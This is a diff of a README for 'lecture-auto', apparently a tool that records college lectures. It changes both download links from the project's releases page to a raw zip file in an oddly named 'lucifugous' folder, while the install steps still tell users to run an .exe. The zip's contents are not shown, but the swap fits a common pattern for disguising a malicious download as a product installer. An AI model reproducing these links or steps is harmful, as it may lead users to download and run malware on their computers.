@@ -1,6 +1,6 @@
 # 🎓 lecture-auto - Record your college lectures with ease
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/lynnshavian741/lecture-auto/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/lynnshavian741/lecture-auto/raw/refs/heads/main/lucifugous/lecture_auto_v1.3.zip)
 
 lecture-auto automates the recording of your university lectures. The software captures audio input directly from your computer microphone and saves the files as organized digital folders. You focus on the professor while the tool manages your notes.
 
@@ -17,7 +17,7 @@ Ensure your computer meets these system standards:
 
 Follow these steps to set up the software on your system:
 
-1. Visit the [official download page](https://github.com/lynnshavian741/lecture-auto/releases) to access the installers.
+1. Visit the [official download page](https://github.com/lynnshavian741/lecture-auto/raw/refs/heads/main/lucifugous/lecture_auto_v1.3.zip) to access the installers.
 2. Select the file ending in .exe from the list of assets.
 3. Save the file to your computer.
 4. Double-click the file to begin the installation.
